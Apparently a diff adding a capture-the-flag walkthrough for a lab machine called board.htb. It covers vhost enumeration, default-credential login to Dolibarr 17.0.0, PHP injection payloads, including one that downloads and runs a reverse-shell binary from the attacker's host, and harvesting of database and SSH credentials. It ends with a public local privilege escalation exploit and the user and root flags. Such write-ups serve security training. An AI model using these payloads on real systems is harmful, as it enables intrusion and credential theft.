@@ -14,3 +14,110 @@ PORT   STATE SERVICE REASON  VERSION
 |_  Supported Methods: GET HEAD POST OPTIONS
 |_http-title: Site doesn't have a title (text/html; charset=UTF-8).
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+gobuster:
+gobuster vhost -u http://board.htb/ -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --append-domain -t 10 
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:             http://board.htb/
+[+] Method:          GET
+[+] Threads:         10
+[+] Wordlist:        /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
+[+] User Agent:      gobuster/3.6
+[+] Timeout:         10s
+[+] Append Domain:   true
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: crm.board.htb Status: 200 [Size: 6360]
+Found: *.board.htb Status: 400 [Size: 301]
+
+found subdomain
+
+added the subdomain to /etc/hosts
+
+inside the subdomain there is a login page 
+
+managed to enter the dashboard via default credentials:
+admin 
+admin 
+
+in tool we have option to add website
+found this vulnerability for this Dolibarr 17.0.0
+https://www.swascan.com/security-advisory-dolibarr-17-0-0/#:~:text=%2Dof%2Dconcept.-,Description,injection%20bypassing%20the%20application%20restrictions.
+found payloads that works:
+
+<?pHp echo 2+2;?>
+<?PHP ECHO SYSTEM("whoami")?>
+<?PHP ECHO SYSTEM("wget http://10.10.14.25:80/rv48 -O /tmp/rv48 && chmod +x /tmp/rv48 && /tmp/rv48")?>
+
+got reverse shell in msfconsole as www-data 
+
+we got 2 users with /bin/sh:
+larissa
+root
+
+find / -type f -user root -perm -4000 -exec ls -ldb {} \;
+
+/var/www/html/crm.board.htb/htdocs/admin
+/var/www/html/board.htb/index.php
+
+find / -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
+find / -type f -exec grep -i -I "larissa" {} /dev/null \;
+
+/usr/share/calendar/fr_FR/calendar.fetes:03/26	N'oubliez pas les Larissa !
+
+updating the shell using:
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+there is libreoffice inside version 6.4
+
+
+
+/sys/kernel/security/apparmor/
+
+in /var/www/html/crm.board.htb/htdocs/conf/conf.php found some creds:
+$dolibarr_main_db_user='dolibarrowner';
+$dolibarr_main_db_pass='serverfun2$2023!!';
+
+managed to connect via mysql:
+mysql -u dolibarrowner -p 
+
+found a table llx_user:
++-------+--------+--------------+---------+-------+----------+------------------+---------------------+---------------------+---------------+---------------+----------+---------------+------+--------------------------------------------------------------+-----------+--------------+--------+----------+------------+-----------+---------+------+------+----------+------------+-------+-------------+------+--------------+------------+-------------+-----------------+-------+----------------+-----------+----------------+--------+--------------+-----------+---------+---------------------------+---------------------------+---------+---------+---------+-------------+--------------+-----------+---------------------+---------------------+------------------------+-------------------+-----------------+-------------+-----------------+---------------+----------+--------+--------+-------+------+-------+---------+-----------------+------------------+------------+------+------+--------+-------------+----------------+-------------------+-------------+------------+---------------+-----------------------+------------------------------+--------------+
+| rowid | entity | ref_employee | ref_ext | admin | employee | fk_establishment | datec               | tms                 | fk_user_creat | fk_user_modif | login    | pass_encoding | pass | pass_crypted                                                 | pass_temp | api_key      | gender | civility | lastname   | firstname | address | zip  | town | fk_state | fk_country | birth | birth_place | job  | office_phone | office_fax | user_mobile | personal_mobile | email | personal_email | signature | socialnetworks | fk_soc | fk_socpeople | fk_member | fk_user | fk_user_expense_validator | fk_user_holiday_validator | idpers1 | idpers2 | idpers3 | note_public | note_private | model_pdf | datelastlogin       | datepreviouslogin   | datelastpassvalidation | datestartvalidity | dateendvalidity | iplastlogin | ippreviouslogin | egroupware_id | ldap_sid | openid | statut | photo | lang | color | barcode | fk_barcode_type | accountancy_code | nb_holiday | thm  | tjm  | salary | salaryextra | dateemployment | dateemploymentend | weeklyhours | import_key | default_range | default_c_exp_tax_cat | national_registration_number | fk_warehouse |
++-------+--------+--------------+---------+-------+----------+------------------+---------------------+---------------------+---------------+---------------+----------+---------------+------+--------------------------------------------------------------+-----------+--------------+--------+----------+------------+-----------+---------+------+------+----------+------------+-------+-------------+------+--------------+------------+-------------+-----------------+-------+----------------+-----------+----------------+--------+--------------+-----------+---------+---------------------------+---------------------------+---------+---------+---------+-------------+--------------+-----------+---------------------+---------------------+------------------------+-------------------+-----------------+-------------+-----------------+---------------+----------+--------+--------+-------+------+-------+---------+-----------------+------------------+------------+------+------+--------+-------------+----------------+-------------------+-------------+------------+---------------+-----------------------+------------------------------+--------------+
+|     1 |      0 |              | NULL    |     1 |        1 |                0 | 2024-05-13 13:21:56 | 2024-05-13 13:21:56 |          NULL |          NULL | dolibarr | NULL          | NULL | $2y$10$VevoimSke5Cd1/nX1Ql9Su6RstkTRe7UX1Or.cm8bZo56NjCMJzCm | NULL      | NULL         |        |          | SuperAdmin |           |         |      |      |     NULL |       NULL | NULL  | NULL        |      |              |            |             |                 |       |                |           | null           |   NULL |         NULL |      NULL |    NULL |                      NULL |                      NULL | NULL    | NULL    | NULL    |             |              | NULL      | 2024-05-15 09:57:04 | 2024-05-13 23:23:59 | NULL                   | NULL              | NULL            | 10.10.14.31 | 10.10.14.41     |          NULL |          | NULL   |      1 | NULL  | NULL |       | NULL    |               0 |                  |          0 | NULL | NULL |   NULL |        NULL | NULL           | NULL              |        NULL | NULL       |          NULL |                  NULL |                              |         NULL |
+|     2 |      1 |              | NULL    |     0 |        1 |                0 | 2024-05-13 13:24:01 | 2024-05-15 09:58:40 |          NULL |          NULL | admin    | NULL          | NULL | $2y$10$gIEKOl7VZnr5KLbBDzGbL.YuJxwz5Sdl5ji3SEuiUSlULgAhhjH96 | NULL      | yr6V3pXd9QEI | NULL   |          | admin      |           |         |      |      |     NULL |       NULL | NULL  | NULL        |      |              |            |             |                 |       |                |           | []             |   NULL |         NULL |      NULL |    NULL |                      NULL |                      NULL | NULL    | NULL    | NULL    |             |              | NULL      | 2024-05-26 10:27:00 | 2024-05-26 10:25:54 | NULL                   | NULL              | NULL            | 10.10.16.5  | 10.10.14.25     |          NULL |          | NULL   |      1 | NULL  | NULL |       | NULL    |               0 |                  |          0 | NULL | NULL |   NULL |        NULL | NULL           | NULL              |        NULL | NULL       |          NULL |                  NULL |                              |         NULL |
++-------+--------+--------------+---------+-------+----------+------------------+---------------------+---------------------+---------------+---------------+----------+---------------+------+--------------------------------------------------------------+-----------+--------------+--------+----------+------------+-----------+---------+------+------+----------+------------+-------+-------------+------+--------------+------------+-------------+-----------------+-------+----------------+-----------+----------------+--------+--------------+-----------+---------+---------------------------+---------------------------+---------+---------+---------+-------------+--------------+-----------+---------------------+---------------------+------------------------+-------------------+-----------------+-------------+-----------------+---------------+----------+--------+--------+-------+------+-------+---------+-----------------+------------------+------------+------+------+--------+-------------+----------------+-------------------+-------------+------------+---------------+-----------------------+------------------------------+--------------+
+
+
+the credentials for ssh to larissa:
+ssh larissa@10.10.11.11
+serverfun2$2023!!
+
+entering as larissa the userflag:
+3073b0cbcb6cc76b347faee64f63140c
+
+launched the find command:
+
+find / -type f -user root -perm -4000 -exec ls -ldb {} \;
+
+found something odd 
+/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
+/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
+/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
+/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
+
+found the CVE-2022-37706 
+
+downloaded the github script (https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit)
+
+downloaded it to /tmp gave it +x permissions
+
+run it and got root
+
+going the root directory and get the root flag:
+3973fa9885ffe0f9516cd317ce7a10d9
